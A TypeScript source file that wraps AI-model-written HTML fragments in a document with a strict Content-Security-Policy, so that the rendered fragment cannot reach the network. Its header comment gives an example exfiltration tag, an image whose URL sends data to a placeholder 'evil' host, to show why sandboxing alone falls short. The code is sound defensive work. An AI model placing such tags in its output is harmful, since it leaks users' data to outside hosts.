/**
 * The document a model-authored HTML fragment is rendered inside.
 *
 * ## What `sandbox=""` actually does, measured against the spec rather than
 * assumed
 *
 * An empty `sandbox` attribute applies every restriction the flag list can
 * lift: no scripts, an opaque origin, no forms, no popups, no top-level
 * navigation, no plugins, no pointer lock, no modals. The comment this
 * replaces read "No scripts, no same-origin, no network", and two of those
 * three were right.
 *
 * Sandboxing says nothing about subresource loading. A sandboxed document
 * still fetches what its markup names — `<img src>`, `<link rel=stylesheet>`,
 * `<video>`, a CSS `url()`, `@font-face`, `<meta http-equiv=refresh>`. So the
 * exact channel closed for markdown in `ui/Markdown.tsx` was open here, on a
 * fragment the model wrote in full: `<img src="https://evil/?d=…">` inside
 * `render_html` is a GET the moment the disclosure is expanded, with no click
 * and no script.
 *
 * The document's own policy is what closes it, and it is inlined rather than
 * inherited. A `srcdoc` document is specified to inherit its parent's CSP, but
 * (a) the app's parent policy sets only `img-src`, so a stylesheet, a font or
 * a `connect-src` would have been unaffected, and (b) inheritance across an
 * opaque-origin sandbox is exactly the kind of thing that is true until a
 * browser version says otherwise. A policy in the document needs neither claim
 * to hold.
 *
 * `default-src 'none'` is the whole point: everything that has to be allowed
 * is then named explicitly, so a directive nobody thought of defaults to
 * refusal instead of to the network. `base-uri` and `form-action` are named
 * separately because neither falls back to `default-src`.
 */
const FRAME_CSP = [
  "default-src 'none'",
  // Inline CSS only — the fragment is told to inline its styles, and a
  // stylesheet URL is a request.
  "style-src 'unsafe-inline'",
  // Images the fragment carries itself. No scheme that leaves the device.
  'img-src data:',
  "base-uri 'none'",
  "form-action 'none'",
].join('; ');

/**
 * Wrap model-authored HTML in a document that cannot reach the network.
 *
 * The policy goes first, before any of the model's bytes. A `<meta>` CSP
 * governs only what follows it, so ordering is load-bearing rather than
 * stylistic — and a second policy the model adds cannot loosen this one:
 * multiple policies intersect, they do not override.
 */
export function frameDocument(html: string): string {
  return `<!doctype html><meta charset="utf-8"><meta http-equiv="Content-Security-Policy" content="${FRAME_CSP}">${html}`;
}

/** Exported so a test can assert the policy rather than restate it. */
export const FRAME_CONTENT_SECURITY_POLICY = FRAME_CSP;
